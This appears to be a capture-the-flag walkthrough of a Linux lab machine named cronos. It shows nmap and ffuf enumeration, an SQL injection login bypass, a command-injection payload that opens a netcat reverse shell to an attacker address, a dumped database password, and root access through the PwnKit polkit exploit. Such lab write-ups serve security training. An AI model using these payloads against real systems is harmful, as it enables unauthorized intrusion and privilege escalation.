


## Lab Details
- Difficulty: Medium
- OS: Linux

## Summary
- Initial access: Web
- Privilege escalation: PolKit LPE

## Enumeration
#### Steps
- Run `nmap`
```
$ nmap 10.129.227.211 -sC -sV -A -p22,53,80 -T5
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-31 00:54 EDT
Nmap scan report for 10.129.227.211
Host is up (0.0017s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- Since DNS service is running on target, we can attempt to perform DNS zone transfer
```
$ dig @10.129.227.211 -x 10.129.227.211

; <<>> DiG 9.20.18-1~deb13u1-Debian <<>> @10.129.227.211 -x 10.129.227.211
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 25991
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;211.227.129.10.in-addr.arpa.	IN	PTR

;; ANSWER SECTION:
211.227.129.10.in-addr.arpa. 604800 IN	PTR	ns1.cronos.htb.

;; AUTHORITY SECTION:
129.10.in-addr.arpa.	604800	IN	NS	ns1.cronos.htb.

;; ADDITIONAL SECTION:
ns1.cronos.htb.		604800	IN	A	10.10.10.13

;; Query time: 3 msec
;; SERVER: 10.129.227.211#53(10.129.227.211) (UDP)
;; WHEN: Sun May 31 00:57:30 EDT 2026
;; MSG SIZE  rcvd: 114
```
- Found the domain name `cronos.htb` add it to `/etc/hosts`
- Enumerate for subdomains 
```
$ ffuf -u "http://10.129.227.211" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.cronos.htb"  -fw 3534

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.227.211
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.cronos.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 3534
________________________________________________

www                     [Status: 200, Size: 2319, Words: 990, Lines: 86, Duration: 153ms]
admin                   [Status: 200, Size: 1547, Words: 525, Lines: 57, Duration: 2091ms]
:: Progress: [19966/19966] :: Job [1/1] :: 2469 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
```
## Foothold 

#### Steps
- Visit `admin.cronos.htb` we see a login form 
- Attempt to bypass the login with `SQLi`
```
## username
admin' OR '1'='1' --
## password
anything
```
- Once logged in we are presented with `Net Tool v0.1` and its vulnerable to command injection
![[Pasted image 20260531132905.png]]
- Payload for RCE
```
8.8.8.8;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.13 4444 >/tmp/f
```
- We get a reverse shell
```
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.227.211 37796
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement 

#### Steps

```
www-data@cronos:/var/www/admin$ cat config.php
cat config.php
<?php
   define('DB_SERVER', 'localhost');
   define('DB_USERNAME', 'admin');
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
   define('DB_DATABASE', 'admin');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
?>

```

## Privilege Escalation

#### Steps
- Run `linpeas.sh` and found that `/var/www/laravel/artisan` has been scheduled to run every minute as root user
```
* * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```
- And current user has permission over the file, potentially overwrite it was RCE
```
www-data@cronos:/tmp$ ls -la /var/www/laravel/artisan
ls -la /var/www/laravel/artisan
-rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 /var/www/laravel/artisan
```
- However also found its vulnerable to `polkit` LPE, download https://github.com/ly4k/PwnKit
- Execute the exploit and obtain root access
```
www-data@cronos:/tmp$ chmod +x ./PwnKit
chmod +x ./PwnKit
www-data@cronos:/tmp$ ./PwnKit
./PwnKit
root@cronos:/tmp#
```

## Lessons Learned
- Attack family:
- Key takeaway:

## Resources
- References: